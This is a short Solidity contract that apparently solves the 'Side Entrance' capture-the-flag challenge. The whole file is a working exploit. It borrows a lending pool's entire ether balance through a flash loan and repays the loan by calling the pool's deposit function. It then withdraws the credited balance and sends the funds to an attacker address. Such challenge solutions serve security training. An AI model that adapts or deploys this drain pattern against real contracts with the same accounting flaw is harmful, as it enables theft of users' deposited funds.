pragma solidity ^0.8.0;


interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideEntranceAttacker is IFlashLoanEtherReceiver{

    address private _target;
    address payable private _attacker;

    constructor(address target, address payable attacker) {
        _target = target;
        _attacker = attacker;
    }

    function execute() override external payable {
        ISideEntranceLenderPool(_target).deposit{value: msg.value}();
    }

    function attack() external {
        ISideEntranceLenderPool(_target).flashLoan(address(_target).balance);
        ISideEntranceLenderPool(_target).withdraw();
    }

    receive () external payable {
        _attacker.transfer(msg.value);
    }
}
